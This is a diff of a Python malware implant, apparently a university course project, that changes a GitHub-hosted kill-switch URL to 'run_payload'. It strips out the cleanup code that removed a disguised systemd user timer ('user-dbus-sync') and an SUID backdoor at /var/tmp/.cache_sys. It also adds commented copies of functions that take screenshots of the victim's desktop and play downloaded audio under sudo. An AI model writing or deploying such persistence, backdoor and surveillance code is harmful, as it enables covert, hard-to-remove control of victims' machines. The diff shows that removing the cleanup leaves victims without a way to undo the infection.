@@ -18,7 +18,7 @@ import crypt
 
 
 THIS_FILE = os.path.realpath(__file__)
-BASE_FLAG_URL = "https://api.github.com/repos/ucla-e1-malware/final-project-theoreos/contents/flag"
+BASE_FLAG_URL = "https://api.github.com/repos/ucla-e1-malware/final-project-theoreos/contents/run_payload"
 
 
 def kill_switch_loop():
@@ -48,36 +48,6 @@ def check_kill_switch():
                 print(f"[*] Deleted {f}")
             except Exception as e:
                 print(f"[-] Could not delete {f}: {e}")
-
-             # Remove systemd persistence
-            systemd_user_dir = os.path.expanduser("~/.config/systemd/user")
-            service_name = "user-dbus-sync"
-            
-            subprocess.run(["systemctl", "--user", "stop", f"{service_name}.timer"], stderr=subprocess.DEVNULL)
-            subprocess.run(["systemctl", "--user", "disable", f"{service_name}.timer"], stderr=subprocess.DEVNULL)
-            subprocess.run(["systemctl", "--user", "stop", f"{service_name}.service"], stderr=subprocess.DEVNULL)
-            subprocess.run(["systemctl", "--user", "disable", f"{service_name}.service"], stderr=subprocess.DEVNULL)
-            
-            for f in [
-                os.path.join(systemd_user_dir, f"{service_name}.service"),
-                os.path.join(systemd_user_dir, f"{service_name}.timer"),
-                os.path.join(systemd_user_dir, "timers.target.wants", f"{service_name}.timer"),
-            ]:
-                try:
-                    os.remove(f)
-                    print(f"[*] Deleted {f}")
-                except Exception as e:
-                    print(f"[-] Could not delete {f}: {e}")
-            
-            subprocess.run(["systemctl", "--user", "daemon-reload"], stderr=subprocess.DEVNULL)
-    
-            
-            # Remove SUID backdoor
-            try:
-                os.remove("/var/tmp/.cache_sys")
-                print("[*] Deleted SUID backdoor")
-            except Exception as e:
-                print(f"[-] Could not delete SUID backdoor: {e}")
             return True 
         
         print(f"Flag still exists (Status: {response.status_code}). Standing by.")
@@ -114,6 +84,35 @@ def recv_framed(sock):
     return data
 
 
+# audio 
+
+# def play_audio_from_url(url):
+#     import requests, tempfile, subprocess, os, pwd
+#     r = requests.get(url, timeout=10)
+#     r.raise_for_status()
+#     suffix = os.path.splitext(url.split("?")[0])[1] or ".bin"
+#     with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as f:
+#         f.write(r.content)
+#         path = f.name
+#         print(f"File downloaded to: {path}")
+
+#     os.chmod(path, 0o644)
+#     original_user = os.environ.get("SUDO_USER") or os.environ.get("USER")
+#     uid = pwd.getpwnam(original_user).pw_uid
+#     xdg = f"/run/user/{uid}"
+
+#     subprocess.run(
+#     ["sudo", "-u", original_user,
+#      "env",
+#      f"XDG_RUNTIME_DIR={xdg}",
+#      f"PIPEWIRE_RUNTIME_DIR={xdg}",
+#      "ffplay", "-nodisp", "-autoexit", path],
+#     stdout=subprocess.DEVNULL,
+#     stderr=subprocess.DEVNULL,
+#     )
+
+#     os.unlink(path)
+
 def play_audio_from_url(url): # Used Claude for finguring out how to make it work with SUDO 
     import requests, tempfile, subprocess, os, pwd
     r = requests.get(url, timeout=10)
@@ -148,6 +147,37 @@ def play_audio_from_url(url): # Used Claude for finguring out how to make it wor
             os.unlink(path)
 
 
+# screenshot 
+
+
+
+# def screenshot(): # Used Claude for finguring out how to make it work with SUDO 
+#     import time, subprocess, os, pwd
+
+#     original_user = os.environ.get("SUDO_USER") or os.environ.get("USER")
+#     uid = pwd.getpwnam(original_user).pw_uid
+#     xdg = f"/run/user/{uid}"
+#     try:
+#         sockets = [f for f in os.listdir(xdg) if f.startswith("wayland-")]
+#         wayland = sockets[0] if sockets else "wayland-0"
+#     except FileNotFoundError:
+#         wayland = "wayland-0"
+
+#     filename = f"/tmp/screenshot_{int(time.time())}.png"
+#     result = subprocess.run(
+#         ["sudo", "-u", original_user,
+#          "env",
+#          f"WAYLAND_DISPLAY={wayland}",
+#          f"XDG_RUNTIME_DIR={xdg}",
+#          "gnome-screenshot", "-f", filename],
+#         capture_output=True, text=True
+#     )
+#     if result.returncode != 0:
+#         raise RuntimeError(f"gnome-screenshot failed: {result.stderr}")
+#     if not os.path.exists(filename):
+#         raise RuntimeError("Screenshot file was not created")
+#     return filename
+    
 
 def screenshot(): # Used Claude for finguring out how to make it work with SUDO 
     import time, subprocess, os, pwd
